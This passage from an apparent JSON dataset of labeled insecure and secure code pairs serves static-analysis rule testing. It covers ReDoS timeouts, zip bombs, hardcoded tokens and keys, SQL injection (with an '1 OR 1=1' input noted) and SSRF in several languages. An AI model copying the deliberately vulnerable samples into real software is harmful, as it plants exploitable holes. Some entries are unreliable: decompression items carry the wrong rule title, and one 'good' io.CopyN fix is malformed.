    "code": "using System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDos\n{\n    public class RegularExpressionsDos\n    {\n        // ok: regular-expression-dos\n        public void ValidateRegex3(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { }, TimeSpan.FromSeconds(2000));\n            rgx.Match(search);\n\n        }\n\n        // ok: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));\n        }\n    }\n}",
    "language": "csharp",
    "description": "regex with timeout"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "using System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDosInfiniteTimeout\n{\n    public class RegularExpressionsDosInfiniteTimeout\n    {\n        // ruleid: regular-expression-dos-infinite-timeout\n        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(10));\n\n        // ruleid: regular-expression-dos-infinite-timeout\n        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.InfiniteMatchTimeout);\n\n        // ruleid: regular-expression-dos-infinite-timeout\n        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromMinutes(1));\n\n        // ruleid: regular-expression-dos-infinite-timeout\n        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromHours(1));\n    }\n}",
    "language": "csharp",
    "description": "regex with excessive or infinite timeout"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "using System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDosInfiniteTimeout\n{\n    public class RegularExpressionsDosInfiniteTimeout\n    {\n        // ok\n        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1));\n    }\n}",
    "language": "csharp",
    "description": "regex with short timeout"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "bad",
    "code": "// cf. https://github.com/securego/gosec/blob/master/testutils/source.go#L684\n\npackage main\nimport (\n\t\"bytes\"\n\t\"compress/zlib\"\n\t\"io\"\n\t\"os\"\n)\nfunc blah() {\n\tbuff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,\n\t\t47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}\n\tb := bytes.NewReader(buff)\n\tr, err := zlib.NewReader(b)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t// ruleid: potential-dos-via-decompression-bomb\n\t_, err := io.Copy(os.Stdout, r)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tr.Close()\n}\n\nfunc blah2() {\n\tbuff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,\n\t\t47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}\n\tb := bytes.NewReader(buff)\n\tr, err := zlib.NewReader(b)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tbuf := make([]byte, 8)\n\t// ruleid: potential-dos-via-decompression-bomb\n\t_, err := io.CopyBuffer(os.Stdout, r, buf)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tr.Close()\n}\n\nfunc blah3() {\n\tr, err := zip.OpenReader(\"tmp.zip\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer r.Close()\n\tfor i, f := range r.File {\n\t\tout, err := os.OpenFile(\"output\" + strconv.Itoa(i), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\trc, err := f.Open()\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\t// ruleid: potential-dos-via-decompression-bomb\n\t\t_, err = io.Copy(out, rc)\n\t\tout.Close()\n\t\trc.Close()\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t}\n}",
    "language": "go",
    "description": "decompression without size limit - zip bomb"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Regular Expression DoS",
    "type": "good",
    "code": "func benign() {\n\ts, err := os.Open(\"src\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer s.Close()\n\td, err := os.Create(\"dst\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer d.Close()\n\t// ok: potential-dos-via-decompression-bomb\n\t_, err = io.Copy(d, s)\n\tif  err != nil {\n\t\tpanic(err)\n\t}\n}\n\nfunc ok() {\n\tbuff := []byte{120, 156, 202, 72, 205, 201, 201, 215, 81, 40, 207,\n\t\t47, 202, 73, 225, 2, 4, 0, 0, 255, 255, 33, 231, 4, 147}\n\tb := bytes.NewReader(buff)\n\tr, err := zlib.NewReader(b)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tbuf := make([]byte, 8)\n\t// ok: potential-dos-via-decompression-bomb\n\t_, err := io.CopyN(os.Stdout, r, buf, 1024*1024*4)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tr.Close()\n}",
    "language": "go",
    "description": "use io.CopyN with size limit"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "import boto3\nfrom boto3 import client\n\n# ruleid:hardcoded-token\nclient(\"s3\", aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n\n# ruleid:hardcoded-token\nboto3.sessions.Session(aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n\ns = boto3.sessions\n# ruleid:hardcoded-token\ns.Session(aws_access_key_id=\"AKIAxxxxxxxxxxxxxxxx\")\n\nuhoh_key = \"AKIAxxxxxxxxxxxxxxxx\"\nok_secret = os.environ.get(\"SECRET_ACCESS_KEY\")\n# ruleid:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=uhoh_key,\n    aws_secret_access_key=ok_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\nok_key = os.environ.get(\"ACCESS_KEY_ID\")\n\nuhoh_secret = \"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\"\n# ruleid:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=uhoh_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)",
    "language": "python",
    "description": "Python - hardcoded AWS credentials with boto3"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "import boto3\nimport os\n\n# ok:hardcoded-token\nkey = os.environ.get(\"ACCESS_KEY_ID\")\nsecret = os.environ.get(\"SECRET_ACCESS_KEY\")\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=key,\n    aws_secret_access_key=secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\n# ok:hardcoded-token\ns3 = client(\"s3\", aws_access_key_id=\"this-is-not-a-key\")\n\n# ok:hardcoded-token - placeholder values\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=\"<your token here>\",\n    aws_secret_access_key=\"<your secret here>\",\n    region_name=\"us-east-1\",\n)",
    "language": "python",
    "description": "Python - AWS credentials from environment variables"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "// ruleid: aws-access-token\nAWS_api_token = \"AKIALALEMEL33243OLIB\"",
    "language": "go",
    "description": "Go - hardcoded AWS access token pattern"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "// ok: aws-access-token\nAWS_api_token = os.Getenv(\"AWS_ACCESS_KEY_ID\")",
    "language": "go",
    "description": "Go - AWS token from environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "\"use strict\";\n\nconst config = require('./config')\nconst jsonwt = require('jsonwebtoken')\n\nfunction example1() {\n  const payload = {foo: 'bar'}\n  const secret = 'shhhhh'\n  // ruleid: hardcoded-jwt-secret\n  const token1 = jsonwt.sign(payload, secret)\n}\n\nfunction example2() {\n  const payload = {foo: 'bar'}\n  // ruleid: hardcoded-jwt-secret\n  const token2 = jsonwt.sign(payload, 'some-secret')\n}\n\nconst Promise = require(\"bluebird\");\nconst secret = \"hardcoded-secret\"\nclass Authentication {\n    static sign(obj){\n        // ruleid: hardcoded-jwt-secret\n        return jsonwt.sign(obj, secret, {});\n    }\n}",
    "language": "javascript",
    "description": "JavaScript - hardcoded JWT secret with jsonwebtoken"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "const config = require('./config')\nconst jsonwt = require('jsonwebtoken')\n\nfunction example3() {\n  // ok: hardcoded-jwt-secret\n  const payload = {foo: 'bar'}\n  const token3 = jsonwt.sign(payload, config.secret)\n}\n\nfunction example4() {\n  // ok: hardcoded-jwt-secret\n  const payload = {foo: 'bar'}\n  const secret2 = config.secret\n  const token4 = jsonwt.sign(payload, secret2)\n}\n\nfunction example5() {\n  // ok: hardcoded-jwt-secret\n  const payload = {foo: 'bar'}\n  const secret3 = process.env.SECRET\n  const token5 = jsonwt.sign(payload, secret3)\n}",
    "language": "javascript",
    "description": "JavaScript - JWT secret from config or environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "var jwt = require('express-jwt');\n\n// ruleid: express-jwt-hardcoded-secret\napp.get('/protected', jwt({ secret: 'shhhhhhared-secret' }), function(req, res) {\n    if (!req.user.admin) return res.sendStatus(401);\n    res.sendStatus(200);\n});\n\n// ruleid: express-jwt-hardcoded-secret\nlet hardcodedSecret = 'shhhhhhared-secret'\n\napp.get('/protected2', jwt({ secret: hardcodedSecret }), function(req, res) {\n\n    if (!req.user.admin) return res.sendStatus(401);\n    res.sendStatus(200);\n});\n\nlet secret = \"hardcode\"\n\nconst opts = Object.assign({issuer: 'http://issuer'}, {secret: secret})\n\napp.get('/protected3', jwt(opts), function(req, res) {\n    if (!req.user.admin) return res.sendStatus(401);\n    res.sendStatus(200);\n});",
    "language": "javascript",
    "description": "JavaScript - hardcoded express-jwt secret"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "var jwt = require('express-jwt');\n\n// ok: express-jwt-hardcoded-secret\napp.get('/ok-protected', jwt({ secret: process.env.SECRET }), function(req, res) {\n    if (!req.user.admin) return res.sendStatus(401);\n    res.sendStatus(200);\n});\n\n\nlet configSecret = config.get('secret')\nconst opts = Object.assign({issuer: 'http://issuer'}, {secret: configSecret})\n\n// ok: express-jwt-hardcoded-secret\napp.get('/ok-protected', jwt(opts), function(req, res) {\n    if (!req.user.admin) return res.sendStatus(401);\n    res.sendStatus(200);\n});",
    "language": "javascript",
    "description": "JavaScript - express-jwt secret from environment or config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "import express from 'express'\nimport session from 'express-session'\nconst app = express()\n\nlet a = 'a'\nlet config = {\n  // ruleid: express-session-hardcoded-secret\n  secret: 'a',\n  resave: false,\n  saveUninitialized: false,\n}\n\napp.use(session({\n  // ruleid: express-session-hardcoded-secret\n  secret: a,\n  resave: false,\n  saveUninitialized: false,\n}));\n\napp.use(session(config));\n\nlet secret2 = {\n  resave: false,\n  // ruleid: express-session-hardcoded-secret\n  secret: 'foo',\n  saveUninitialized: false,\n}\napp.use(session(secret2));",
    "language": "typescript",
    "description": "TypeScript - hardcoded express-session secret"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "import express from 'express'\nimport session from 'express-session'\nconst app = express()\n\nlet config1 = {\n  // ok: express-session-hardcoded-secret\n  secret: config.secret,\n  resave: false,\n  saveUninitialized: false,\n}\n\napp.use(session(config1));\n\napp.use(session({\n  // ok: express-session-hardcoded-secret\n  secret: config.secret,\n  resave: false,\n  saveUninitialized: false,\n}));",
    "language": "typescript",
    "description": "TypeScript - express-session secret from config"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "package main\n\nimport (\n\t\"github.com/dgrijalva/jwt-go\"\n)\n\nfunc Signin(w http.ResponseWriter, r *http.Request) {\n\n\t// Create the JWT key used to create the signature\n\tvar jwtKey = []byte(\"my_secret_key\")\n\n\t// Declare the token with the algorithm used for signing, and the claims\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\t// ruleid: hardcoded-jwt-key\n\ttokenString, err := token.SignedString(jwtKey)\n\t// ruleid: hardcoded-jwt-key\n\ttokenString, err := token.SignedString([]byte(\"my_secret_key\"))\n\tif err != nil {\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n}",
    "language": "go",
    "description": "Go - hardcoded jwt-go key"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "package main\n\nimport (\n\t\"os\"\n\t\"github.com/dgrijalva/jwt-go\"\n)\n\nfunc Signin(w http.ResponseWriter, r *http.Request) {\n\t// ok: hardcoded-jwt-key - get secret from environment\n\tvar jwtKey = []byte(os.Getenv(\"JWT_SECRET\"))\n\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\ttokenString, err := token.SignedString(jwtKey)\n\tif err != nil {\n\t\tw.WriteHeader(http.StatusInternalServerError)\n\t\treturn\n\t}\n}",
    "language": "go",
    "description": "Go - JWT key from environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "package jwt_test.jwt_test_1;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\n\npublic class App\n{\n\n    static String secret = \"secret\";\n\n    private static void bad1() {\n        try {\n            // ruleid: java-jwt-hardcoded-secret\n            Algorithm algorithm = Algorithm.HMAC256(\"secret\");\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n}\n\nabstract class App2\n{\n// ruleid: java-jwt-hardcoded-secret\n    static String secret = \"secret\";\n\n    public void bad2() {\n        try {\n            Algorithm algorithm = Algorithm.HMAC256(secret);\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n}",
    "language": "java",
    "description": "Java - hardcoded java-jwt secret"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "package jwt_test.jwt_test_1;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\n\npublic class App\n{\n\n    private static void ok1(String secretKey) {\n        try {\n            // ok: java-jwt-hardcoded-secret\n            Algorithm algorithm = Algorithm.HMAC256(secretKey);\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n    public static void main( String[] args )\n    {\n        ok1(args[0]);\n    }\n}",
    "language": "java",
    "description": "Java - JWT secret from parameter"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "// ruleid: github-pat\ngithub_api_token = \"ghp_emmtytndiqky5a98w0s98w36vfhiz6f7ed4c\"",
    "language": "go",
    "description": "Go - hardcoded GitHub personal access token"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "// ok: github-pat\ngithub_api_token = os.Getenv(\"GITHUB_TOKEN\")",
    "language": "go",
    "description": "Go - GitHub token from environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "// ruleid: stripe-access-token\nstripeToken := \"sk_test_20cbqx6v2hpftsbq203r36yqccazez\"",
    "language": "go",
    "description": "Go - hardcoded Stripe access token"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "// ok: stripe-access-token\nstripeToken := os.Getenv(\"STRIPE_SECRET_KEY\")",
    "language": "go",
    "description": "Go - Stripe token from environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "// ruleid: private-key\n[]string{`-----BEGIN PRIVATE KEY-----\nanything\n-----END PRIVATE KEY-----`,\n\t\t`-----BEGIN RSA PRIVATE KEY-----\nabcdefghijklmnopqrstuvwxyz\n-----END RSA PRIVATE KEY-----\n`,\n\t\t`-----BEGIN PRIVATE KEY BLOCK-----\nanything\n-----END PRIVATE KEY BLOCK-----`,\n\t}",
    "language": "go",
    "description": "Go - hardcoded private key"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "// ok: private-key - load from file or environment\nprivateKey, err := ioutil.ReadFile(os.Getenv(\"PRIVATE_KEY_PATH\"))\nif err != nil {\n    log.Fatal(err)\n}",
    "language": "go",
    "description": "Go - private key from file or environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "# ruleid: check-secrets\nPASSWORD = \"superdupersecret\"\nhttp_basic_authenticate_with :name => \"superduperadmin\", :password => PASSWORD, :only => :create",
    "language": "ruby",
    "description": "Ruby - hardcoded secrets"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "# ok: check-secrets\nsecret = get_from_store('somepass')\n# ok: check-secrets\nrest_auth_site_key = \"\"",
    "language": "ruby",
    "description": "Ruby - secrets from secure store"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "class DangerousController < ApplicationController\n  # ruleid:hardcoded-http-auth-in-controller\n  http_basic_authenticate_with :name => \"dhh\", :password => \"secret\", :except => :index\n\n  puts \"do more stuff\"\n\nend",
    "language": "ruby",
    "description": "Ruby - hardcoded HTTP auth password in controller"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "# ok:hardcoded-http-auth-in-controller\nclass OkController < ApplicationController\n\n  http_basic_authenticate_with :name => \"dhh\", :password => not_a_string, :except => :index\n\n  puts \"do more stuff\"\n\nend",
    "language": "ruby",
    "description": "Ruby - HTTP auth password from variable"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "import os\nimport flask\napp = flask.Flask(__name__)\n\n# ruleid: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=\"aaaa\")\n# ruleid: avoid_hardcoded_config_SECRET_KEY\napp.config[\"SECRET_KEY\"] = '_5#y2L\"F4Q8z\\n\\xec]/'",
    "language": "python",
    "description": "Python Flask - hardcoded SECRET_KEY"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "import os\nimport flask\napp = flask.Flask(__name__)\n\n# ok: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=os.getenv(\"SECRET_KEY\"))\n# ok: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=os.environ[\"SECRET_KEY\"])",
    "language": "python",
    "description": "Python Flask - SECRET_KEY from environment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "from models import UserProfile\n\ndef test_email_auth_backend_empty_password(user_profile: UserProfile) -> None:\n    user_profile = example_user('hamlet')\n\n    # ruleid: password-empty-string\n    password = \"\"\n    user_profile.set_password(password)\n    user_profile.save()\n\n    # ruleid: password-empty-string\n    password = ''\n    user_profile.set_password(password)\n    user_profile.save()",
    "language": "python",
    "description": "Python Django - empty password string"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "from models import UserProfile\n\ndef test_email_auth_backend_empty_password(user_profile: UserProfile) -> None:\n    user_profile = example_user('hamlet')\n    # ok: password-empty-string\n    password = \"testpassword\"\n    user_profile.set_password(password)\n    user_profile.save()",
    "language": "python",
    "description": "Python Django - non-empty password"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "import jwt\n\n# ruleid: jwt-python-exposed-credentials\npayload = {'foo': 'bar','password': 123}\n\ndef bad1(secret, value):\n    # ruleid: jwt-python-exposed-credentials\n    encoded = jwt.encode({'some': 'payload','password': value}, secret, algorithm='HS256')\n    return encoded\n\ndef bad3(secret, value):\n    # ruleid: jwt-python-exposed-credentials\n    pp = {'one': 'two','password': value}\n    encoded = jwt.encode(pp, secret, algorithm='HS256')\n    return encoded",
    "language": "python",
    "description": "Python JWT - exposed credentials in token payload"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "import jwt\n\ndef ok(secret_key):\n    # ok: jwt-python-exposed-credentials\n    encoded = jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')\n    return encoded",
    "language": "python",
    "description": "Python JWT - no credentials in token payload"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "bad",
    "code": "resource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-creds-exposure\n        Action = \"sts:GetSessionToken\"\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\nresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-creds-exposure\n        Action = [\"ec2:GetPasswordData\"]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\ndata aws_iam_policy_document \"policy\" {\n   statement {\n     # ruleid: no-iam-creds-exposure\n     actions = [\"chime:CreateApiKey\"]\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"*\"]\n     }\n     resources = [\"*\"]\n   }\n}",
    "language": "hcl",
    "description": "Terraform - IAM credentials exposure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Hardcoded Secrets",
    "type": "good",
    "code": "resource \"aws_iam_user_policy\" \"lb_ro\" {\n  name = \"test\"\n  user = aws_iam_user.lb.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ok: no-iam-creds-exposure\n        Action = [\n          \"ec2:Describe*\",\n        ]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\ndata aws_iam_policy_document \"policy\" {\n   statement {\n     # ok: no-iam-creds-exposure\n     actions = [\"ec2:Describe\"]\n     resources = [\"*\"]\n   }\n}\n\nresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ok: no-iam-creds-exposure - Deny effect\n        Action = [\"ec2:GetPasswordData\"]\n        Effect   = \"Deny\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\ndata aws_iam_policy_document \"policy\" {\n   statement {\n     # ok: no-iam-creds-exposure - Deny effect\n     actions = [\"chime:CreateApiKey\"]\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"*\"]\n     }\n     resources = [\"*\"]\n     effect = \"Deny\"\n   }\n}",
    "language": "hcl",
    "description": "Terraform - IAM policy without credentials exposure"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent SQL Injection",
    "type": "bad",
    "code": "// Vulnerable: concatenates user input directly into SQL\nimport { Pool } from 'pg'\nconst pool = new Pool()\n\nexport async function handler(req: any, res: any) {\n  const userId = req.query.id // attacker can supply \"1 OR 1=1\"\n  const sql = `SELECT id, username, email FROM users WHERE id = ${userId}`\n  const { rows } = await pool.query(sql)\n  res.json(rows)\n}",
    "language": "typescript",
    "description": "vulnerable SQL - Node.js / TypeScript"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent SQL Injection",
    "type": "good",
    "code": "// Safe: use parameterized queries to avoid SQL injection\nimport { Pool } from 'pg'\nconst pool = new Pool()\n\nexport async function handler(req: any, res: any) {\n  const userId = req.query.id\n  const sql = 'SELECT id, username, email FROM users WHERE id = $1'\n  const { rows } = await pool.query(sql, [userId])\n  res.json(rows)\n}",
    "language": "typescript",
    "description": "parameterized query - Node.js / TypeScript"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "from django.http import HttpResponse\nimport requests\n\ndef ex1(request):\n  env = request.POST.get('env')\n  user_name = request.POST.get('user_name')\n  # ruleid: tainted-url-host\n  user_age = requests.get(\"https://%s/%s/age\" % (env, user_name))\n  return HttpResponse(user_age)\n\ndef ex2(request):\n  env = request.POST.get('env')\n  user_name = request.POST.get('user_name')\n  # ruleid: tainted-url-host\n  user_age = requests.get(\"https://{}/{}/age\".format(env, user_name))\n  return HttpResponse(user_age)\n\ndef ex3(request):\n  env = request.POST.get('env')\n  user_name = request.POST.get('user_name')\n  # ruleid: tainted-url-host\n  user_age = requests.get(f\"https://{env}/{user_name}/age\")\n  return HttpResponse(user_age)",
    "language": "python",
    "description": "Django - user data flows into URL host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "from django.http import HttpResponse\nimport requests\n\ndef ok1(request):\n  env = request.POST.get('env')\n  user_name = request.POST.get('user_name')\n  # ok: tainted-url-host\n  user_age = requests.get(\"https://example.com/%s/%s/age\" % (env, user_name))\n  return HttpResponse(user_age)\n\ndef ok2(request):\n  env = request.POST.get('env')\n  user_name = request.POST.get('user_name')\n  # ok: tainted-url-host\n  user_age = requests.get(\"https://example.com/%s/%s/age\".format(env, user_name))\n  return HttpResponse(user_age)",
    "language": "python",
    "description": "Django - fixed host with user data in path only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "from requests import get\nfrom django.shortcuts import render\n\ndef send_to_redis(request):\n    # ruleid: ssrf-injection-requests\n    bucket = request.GET.get(\"bucket\")\n    inner_response = get(\"http://my.redis.foo/{}\".format(bucket), data=3)\n    return render({\"response_code\": inner_response.status_code})\n\ndef send_to_redis_fstring(request):\n    # ruleid: ssrf-injection-requests\n    bucket = request.GET.get(\"bucket\")\n    inner_response = get(f\"http://my.redis.foo/{bucket}\", data=3)\n    return render({\"response_code\": inner_response.status_code})",
    "language": "python",
    "description": "Django - SSRF via requests library"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "from urllib.request import urlopen\nfrom django.shortcuts import render\n\ndef send_to_redis(request):\n    # ruleid: ssrf-injection-urllib\n    bucket = request.GET.get(\"bucket\")\n    inner_response = urlopen(\"http://my.redis.foo/{}\".format(bucket), data=3)\n    return render({\"response_code\": inner_response.status_code})",
    "language": "python",
    "description": "Django - SSRF via urllib"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "import flask\nimport requests\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    print(\"blah\")\n    # ruleid: tainted-url-host\n    url = \"https://%s/path\" % route_param\n    requests.get(url)\n    return True\n\n@app.route(\"/get_param_inline\", methods=[\"GET\"])\ndef get_param_inline():\n    # ruleid: tainted-url-host\n    return \"<a href='https://%s/path'>Click me!</a>\" % flask.request.args.get(\"param\")\n\n@app.route(\"/get_param_inline_concat\", methods=[\"GET\"])\ndef get_param_inline_concat():\n    # ruleid: tainted-url-host\n    return \"<a href='http://\" + flask.request.args.get(\"param\") + \"'>Click me!</a>\"",
    "language": "python",
    "description": "Flask - user data flows into URL host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "import flask\nimport requests\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    print(\"blah\")\n    # ok: tainted-url-host\n    return \"<a href='https://example.com'>Click me!</a>\"\n\n@app.route(\"/get_param_inline_concat_ok_in_path\", methods=[\"GET\"])\ndef get_param_inline_concat_ok_in_path():\n    # ok: tainted-url-host\n    return \"<a href='http://example.com/\" + flask.request.args.get(\"param\") + \"'>Click me!</a>\"\n\n@app.route(\"/route_param/<route_param>\")\ndef doesnt_use_the_route_param(route_param):\n    not_the_route_param = \"hello.com\"\n    # ok: tainted-url-host\n    url = \"https://%s/path\" % not_the_route_param\n    requests.get(url)\n    return True",
    "language": "python",
    "description": "Flask - fixed host, user data only in path"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
